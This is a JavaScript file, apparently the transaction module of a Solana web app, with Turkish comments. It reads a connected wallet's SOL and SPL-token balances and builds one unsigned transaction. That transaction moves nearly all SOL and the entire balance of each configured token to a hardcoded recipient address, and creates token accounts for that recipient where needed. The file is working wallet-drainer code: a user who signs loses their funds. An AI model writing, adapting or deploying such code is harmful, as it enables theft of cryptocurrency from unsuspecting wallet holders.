/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

/**
 * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
 * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
 */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("4f3fYctHTiAehgJcp3DxzH97jf77buPBRVrd1Z48F8sG"); // Receipnt Adress

  // SOL bakiyesi kontrolü
  const userSolLamports = await connection.getBalance(payer);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const userAta = await getAssociatedTokenAddress(mint, payer);
    let amount = 0, sufficient = false;
    try {
      const acct = await getAccount(connection, userAta);
      amount = Number(acct.amount);
      sufficient = amount > threshold;
    } catch {
      sufficient = false;
    }
    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
    return { mint, userAta, toAta, amount, sufficient };
  });
  const userTokenInfos = await runBatches(balanceTasks);

  // Hiçbir varlık yeterli değilse çık
  if (!isSolSufficient && !userTokenInfos.some((t) => t.sufficient)) {
    console.warn("Yeterli bakiye yok!");
    return null;
  }

  // 2) Alıcı ATA'larını batch'li olarak kontrol et
  const creationTasks = userTokenInfos
    .filter((t) => t.sufficient)
    .map(({ toAta }) => async () => {
      try {
        await getAccount(connection, toAta);
        return false; // zaten var
      } catch {
        return true;  // yaratılmalı
      }
    });
  const shouldCreateAta = await runBatches(creationTasks);

  // 3) Instruction'ları sırayla derle
  const instructions = [];

  // 3a) SOL transfer instruction
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey:   toPublicKey,
        lamports:   solToSend,
      })
    );
  }

  // 3b) SPL-token ATA oluşturma ve transfer
  let idx = 0;
  for (const { userAta, toAta, amount, sufficient, mint } of userTokenInfos) {
    if (!sufficient) continue;

    // ➊ Eksikse ATA oluştur
    if (shouldCreateAta[idx]) {
      instructions.push(
        createAssociatedTokenAccountInstruction(
          payer,
          toAta,
          toPublicKey,
          mint
        )
      );
    }
    // ➋ Token transfer
    instructions.push(
      createTransferInstruction(
        userAta,
        toAta,
        payer,
        amount
      )
    );
    idx++;
  }

  // 4) Tek bir VersionedTransaction oluştur
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey:        payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
